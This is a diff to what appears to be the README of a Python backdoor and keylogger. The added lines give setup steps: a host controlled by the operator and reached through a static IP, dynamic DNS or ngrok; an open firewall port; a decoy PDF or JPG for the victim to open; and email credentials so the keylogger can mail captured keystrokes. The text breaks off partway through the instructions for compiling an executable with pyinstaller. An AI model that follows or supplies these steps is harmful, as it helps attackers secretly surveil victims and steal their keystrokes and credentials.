@@ -18,4 +18,14 @@ Before we use the backdoor, we need the following things:
 1. A host that you control having a static IP or a subscription service with a dynamic DNS client. You can also use a tunnelling service such as `ngrok`.
 Find the links in the <a href="#references">references</a> section.
 2. Now that you have the public IP/dynamic DNS configured, setup the firewall to allow a port that you want the traffic to be received to (on the host you control)
-3. Open the `data.py` file and put these values in
+3. Open the `data.py` file and put these values in the respective fields.
+Note that there are other data values but you do not need to change them
+4. Have a file that you want the victim to open ready - a pdf or a jpg etc. <u> Note the name and full path of the file</u> on the host computer where you will compile this backdoor
+5. Input this file name in the double quotes given in `data.py`
+6. If you want the keylogger to send you mails periodically, add your email and password in the `data.py`
+
+### <a id="converting" style="color: rgb(0,0,0)"><u>Converting into an Executable</u></a>:
+1. We will use the pyinstaller module for this. Make sure you have python3.7 installed on the host system you control
+
+ `pip3 install pyinstaller`
+2.
